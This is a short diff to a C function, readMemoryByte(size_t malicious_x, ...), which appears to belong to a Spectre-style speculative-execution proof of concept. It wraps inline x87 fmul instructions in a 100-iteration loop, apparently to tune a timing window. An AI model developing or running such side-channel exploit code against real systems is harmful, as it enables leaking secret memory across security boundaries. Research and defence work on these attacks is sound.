@@ -46,18 +46,22 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
     // Seed the generator
     srand(time(0));
-    float num1 = (float)(rand()) / (float)(rand());
-    float num2 = (float)(rand()) / (float)(rand());
-    float result;
+    float result_div;
 
-    asm(
-        ".rept 30;"
-        "fld %1;"
-        "fmul %2;"
-        "fstp %0;"
-        ".endr;"
-        : "=m"(result)
-        : "m"(num1), "m"(num2));
+    for (i = 0; i < 100; i++)
+    {
+        float num1 = (float)(rand()) / (float)(rand());
+        float num2 = (float)(rand()) / (float)(rand());
+
+        asm(
+            ".rept 30;"
+            "fld %1;"
+            "fmul %2;"
+            "fstp %0;"
+            ".endr;"
+            : "=m"(result_div)
+            : "m"(num1), "m"(num2));
+    }
 
     for (i = 0; i < 256; i++)
         results[i] = 0;
